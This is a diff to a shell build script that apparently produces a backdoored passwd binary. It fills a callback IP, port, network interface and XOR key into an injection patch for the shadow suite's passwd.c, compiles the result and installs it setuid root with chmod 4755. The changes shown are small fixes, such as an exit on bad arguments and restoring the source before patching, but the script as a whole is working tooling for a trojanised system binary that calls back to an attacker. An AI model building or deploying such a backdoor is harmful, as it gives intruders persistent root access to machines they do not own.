@@ -10,7 +10,8 @@ fi
 ## Check if Correct Number of Variables ##
 if [ $# -ne 4 ]; then
   echo "Illegal number of parameters"
-  echo "Usage : ./generate {Callback IP} {Port} {Interface} {XOR Key}"
+  echo "Usage : ./generate.sh {Callback IP} {Port} {Interface} {XOR Key}"
+  exit
 fi
 
 ## Assign Variables ##
@@ -34,13 +35,17 @@ cd shadow
 cd ../
 
 ## Add Inject Code ##
+cp passwdTemplate.patch passwd.patch
 sed -i 's/%ip%/'"$ip"'/g' passwd.patch
 sed -i 's/%port%/'"$port"'/g' passwd.patch
 sed -i 's/%int%/'"$interface"'/g' passwd.patch 
 sed -i 's/%key%/'"$key"'/g' passwd.patch 
+git restore shadow/src/passwd.c
 patch shadow/src/passwd.c passwd.patch 
 
 ## Make ##
+cd shadow
 sudo make all 
+cd ../
 cp shadow/src/passwd ../
 chmod 4755 passwd 
